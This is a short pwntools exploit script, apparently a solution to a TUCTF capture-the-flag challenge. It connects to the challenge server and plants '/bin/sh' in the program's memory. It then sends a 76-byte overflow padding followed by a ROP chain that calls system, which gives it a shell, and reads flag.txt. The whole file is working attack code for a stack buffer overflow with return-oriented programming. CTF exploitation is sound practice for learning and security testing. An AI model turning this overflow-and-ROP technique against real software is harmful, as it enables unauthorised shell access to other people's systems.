from pwn import *

#r = process("./ctf")
r = remote("chal.tuctf.com", 30500)
elf = ELF("./ctf")

rop = ROP(elf)
rop.system(0x0804c080)

r.recv()
r.sendline("/bin/sh\x00")

r.recv()
r.sendline("2")

r.recv()

payload = ""
payload += "A" * 76
payload += str(rop)
r.sendline(payload)

r.sendline("cat flag.txt")
r.recv()
print(r.recv())
